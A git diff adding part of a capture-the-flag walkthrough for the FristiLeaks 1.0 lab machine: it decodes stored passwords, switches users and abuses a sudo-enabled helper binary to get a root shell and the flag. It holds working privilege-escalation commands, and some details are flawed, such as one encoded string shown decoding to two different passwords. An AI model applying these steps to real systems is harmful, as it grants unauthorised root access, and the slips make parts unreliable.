@@ -171,13 +171,15 @@ interesting files are :
 - cryptedpass.txt
 - cryptpass.py
 
-we look at all these files :
+we look at all of these files :
 
 ```bash
 [admin@localhost ~]$ cat whoisyourgodnow.txt
 =RFn0AKnlMHMPIzpyuTI0ITG
+
 [admin@localhost ~]$ cat cryptedpass.txt
 mVGZ3O3omkJLmy2pcuTq
+
 [admin@localhost ~]$ cat cryptpass.py
 #Enhanced with thanks to Dinesh Singh Sikawar @LinkedIn
 import base64,codecs,sys
@@ -190,8 +192,94 @@ cryptoResult=encodeString(sys.argv[1])
 print cryptoResult
 ```
 
+it seems the python file is using ase64 to encode the input and then `rot13` algorithm. and the other 2 files are the output of this python function.
+
+we need to reverse the process so i write a python script to reverse it :
+
+```python
+import base64,codecs,sys
+
+def decoodeString(str):
+    decode = codecs.decode(str[::-1], 'rot13')
+    return base64.b64decode(decode)
+
+cryptoResult=decoodeString(sys.argv[1])
+print(cryptoResult)
+```
+
+now we pass this function the content of the other two files :
+
+```python
+python decode.py =RFn0AKnlMHMPIzpyuTI0ITG
+b'LetThereBeFristi!'
+
+python decode.py =RFn0AKnlMHMPIzpyuTI0ITG
+b'thisisalsopw123'
+```
+
+## Privilege Escalation to fristigod user
+
+Now that we have decoded the strings, we can change the user to `fristigod`
+
+```bash
+[admin@localhost ~]$ su fristigod
+Password: 
+bash-4.1$ id
+uid=502(fristigod) gid=502(fristigod) groups=502(fristigod)
+bash-4.1$
+```
+
+now we are user fristigod, so we check our privileges on files and folders :
+
+```bash
+bash-4.1$ find / -user fristigod -o -group fristigod 2> /dev/null
+
+/home/fristigod
+/home/fristigod/.bash_logout
+/home/fristigod/.bashrc
+/home/fristigod/.bash_profile
+/var/spool/mail/fristigod
+/var/fristigod
+/var/fristigod/.bash_history
+/var/fristigod/.secret_admin_stuff
+```
+
+## Privilege Escalation to root
+
+Interesting!! there is two hidden files in `/var/fristigod`, examining the `.bash_history` shows previous commands :
+
+```bash
+bash-4.1$ cd /var/fristigod
+bash-4.1$ cat .bash_history
+```
+
+this line draws my attenstion : `sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom ls /`
+
+we figure out that there is a `doCom` binary in `.secret_admin_stuff` that is using sudo privileges to run a command
+
+so we can run any command with this binary :
+
+```bash
+bash-4.1# bash-4.1$ sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom bash -p
+[sudo] password for fristigod: 
+bash-4.1# id
+uid=0(root) gid=100(users) groups=100(users),502(fristigod)
+bash-4.1#
+```
+yes, we are now the root user, let's navigate to `/root` and read the flag :
+
+```bash
+bash-4.1# cd /root
+bash-4.1# cat fristileaks_secrets.txt 
+Congratulations on beating FristiLeaks 1.0 by Ar0xA [https://tldr.nu]
+
+I wonder if you beat it in the maximum 4 hours it's supposed to take!
+
+Shoutout to people of #fristileaks (twitter) and #vulnhub (FreeNode)
 
 
+Flag: Y0u_kn0w_y0u_l0ve_fr1st1
+```
 
-
+This is how you can pawn this box :)
 
